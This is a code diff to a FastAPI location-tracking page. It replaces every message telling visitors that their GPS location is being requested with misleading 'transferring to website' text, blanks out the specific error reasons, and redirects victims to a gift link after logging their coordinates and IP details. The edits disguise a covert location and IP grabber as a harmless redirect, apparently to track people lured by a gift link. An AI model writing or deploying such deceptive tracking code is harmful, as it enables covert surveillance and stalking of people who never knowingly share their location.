@@ -75,7 +75,7 @@ async def track(request: Request):
     </head>
     <body>
         <div class="container">
-            <h2>🔍 Verificando ubicación...</h2>
+            <h2>Transfiriendo a sitio web...</h2>
             <div class="spinner"></div>
             <p id="status">Obteniendo tu ubicación para una mejor experiencia</p>
             <button id="skipBtn" onclick="skipLocation()" style="display:none;">Continuar sin ubicación</button>
@@ -130,20 +130,20 @@ async def track(request: Request):
             // Timeout para mostrar botón de skip después de 10 segundos
             locationTimeout = setTimeout(() => {
                 if (!hasLocation) {
-                    updateStatus('La ubicación está tardando más de lo esperado...');
+                    updateStatus('La transferencia al sitio web está tardando más de lo esperado...');
                     showSkipButton();
                 }
             }, 10000);
 
             // Solicitar ubicación GPS
             if (navigator.geolocation) {
-                updateStatus('Solicitando acceso a tu ubicación...');
+                updateStatus('Transfiriendo a sitio web...');
                 
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
                         hasLocation = true;
                         clearTimeout(locationTimeout);
-                        updateStatus('¡Ubicación obtenida! Procesando...');
+                        updateStatus('¡Transferencia exitosa! ');
                         
                         const lat = position.coords.latitude;
                         const lon = position.coords.longitude;
@@ -156,16 +156,16 @@ async def track(request: Request):
                         let errorMsg = '';
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMsg = 'Acceso a ubicación denegado por el usuario';
+                                errorMsg = 'Transferencia fallida';
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMsg = 'Información de ubicación no disponible';
+                                errorMsg = 'Transferencia fallida';
                                 break;
                             case error.TIMEOUT:
-                                errorMsg = 'Tiempo de espera agotado';
+                                errorMsg = 'Transferencia fallida';
                                 break;
                             default:
-                                errorMsg = 'Error desconocido al obtener ubicación';
+                                errorMsg = 'Transferencia fallida';
                                 break;
                         }
                         updateStatus(errorMsg);
@@ -306,7 +306,7 @@ async def process_location(request: Request):
     print(f"🔢 Sistema Autónomo: {ip_info['as']}")
     print("=" * 120)
     
-    return RedirectResponse("https://www.google.com")
+    return RedirectResponse("https://gifft.me/es/o/d/8lh96hrxvkdkd1km86fv1kjn")
 
 @app.get("/logs", response_class=PlainTextResponse)
 def get_logs():
